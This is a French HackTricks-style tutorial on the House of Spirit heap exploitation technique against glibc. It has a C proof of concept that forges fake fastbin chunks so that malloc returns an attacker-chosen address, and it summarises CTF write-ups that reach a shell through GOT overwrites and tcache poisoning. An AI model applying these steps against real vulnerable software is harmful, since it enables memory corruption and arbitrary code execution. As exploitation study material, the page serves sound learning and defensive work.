# Maison de l'Esprit

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

### Code

<details>

<summary>Maison de l'Esprit</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### Objectif

- Être capable d'ajouter dans le tcache / fast bin une adresse afin qu'il soit possible de l'allouer plus tard.

### Exigences

- Cette attaque nécessite qu'un attaquant puisse créer quelques faux fast chunks indiquant correctement la valeur de taille et ensuite être capable de libérer le premier faux chunk pour qu'il entre dans le bin.

### Attaque

- Créer des faux chunks qui contournent les vérifications de sécurité : vous aurez besoin de 2 faux chunks indiquant essentiellement aux bonnes positions les bonnes tailles.
- Parvenir à libérer le premier faux chunk pour qu'il entre dans le fast ou tcache bin et ensuite l'allouer pour écraser cette adresse.

**Le code de** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html) **est excellent pour comprendre l'attaque.** Bien que ce schéma du code le résume assez bien :
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
> [!NOTE]
> Notez qu'il est nécessaire de créer le deuxième morceau afin de contourner certaines vérifications de validité.

## Exemples

- **CTF** [**https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html**](https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html)

- **Libc infoleak** : Via un débordement, il est possible de changer un pointeur pour qu'il pointe vers une adresse GOT afin de divulguer une adresse libc via l'action de lecture du CTF.
- **House of Spirit** : En abusant d'un compteur qui compte le nombre de "fusils", il est possible de générer une taille factice du premier morceau factice, puis en abusant d'un "message", il est possible de falsifier la deuxième taille d'un morceau et enfin, en abusant d'un débordement, il est possible de changer un pointeur qui va être libéré afin que notre premier morceau factice soit libéré. Ensuite, nous pouvons l'allouer et à l'intérieur, il y aura l'adresse où le "message" est stocké. Ensuite, il est possible de faire pointer cela vers l'entrée `scanf` dans la table GOT, afin que nous puissions l'écraser avec l'adresse de system.\
La prochaine fois que `scanf` est appelé, nous pouvons envoyer l'entrée `"/bin/sh"` et obtenir un shell.

- [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
- **Glibc leak** : Tampon de pile non initialisé.
- **House of Spirit** : Nous pouvons modifier le premier index d'un tableau global de pointeurs de tas. Avec une seule modification de byte, nous utilisons `free` sur un morceau factice à l'intérieur d'un morceau valide, de sorte que nous obtenons une situation de morceaux qui se chevauchent après avoir réalloué. Avec cela, une simple attaque de poisoning Tcache fonctionne pour obtenir une primitive d'écriture arbitraire.

## Références

- [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)

{{#include ../../banners/hacktricks-training.md}}
